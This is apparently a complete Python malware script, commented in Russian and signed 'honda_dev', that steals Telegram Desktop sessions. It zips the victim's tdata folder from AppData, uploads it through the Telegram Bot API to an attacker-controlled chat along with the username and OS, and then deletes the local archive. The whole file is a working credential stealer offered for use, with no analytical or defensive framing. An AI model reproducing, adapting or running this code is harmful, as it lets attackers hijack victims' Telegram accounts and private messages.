import os
import shutil
import stat
import requests

from decouple import config
from zipfile import ZipFile

# Настройка бота [из конфига .env]
TOKEN = config("BOT_TOKEN")
id = config("CHAT_ID")


# Получаем текущий пользователь:
username = os.getlogin()

def grabber_logs():
    """
    метод позволяющий грабить сессий tdata.
    """
    file = os.path.join(fr"C:\Users\{username}", "AppData", "Roaming", "Telegram Desktop", "tdata")
    os.chmod(file, stat.S_IRUSR | stat.S_IWUSR) 

    if os.path.exists(file):
        tdata_path = shutil.make_archive(f'{os.getlogin()}_session', 'zip', file)
        sender(tdata_path)
    else:
        return


def sender(path):
    """
    Берём готовый ZIP-архив и высылаем тебе :)
    """
    
    url = f'https://api.telegram.org/bot{TOKEN}/sendDocument'

    text = f"""
=============  NEW TDATA SESSION =============
<blockquote>👤 Имя пользователя: {os.getlogin()}
💻 Операционная система {os.name}
\t\t\t\t\t\t\t\t\t 🌸 by honda_dev.</blockquote>
"""

    with open(path, "rb") as file:
        data = {
            "chat_id": id,
            "caption": text,
            "thumbnail": text,
            "parse_mode": "HTML"
        }
        file = {"document": file}

        
        response = requests.post(url, data=data, files=file )
    os.remove(path)

if __name__ == "__main__":
    grabber_logs()
   
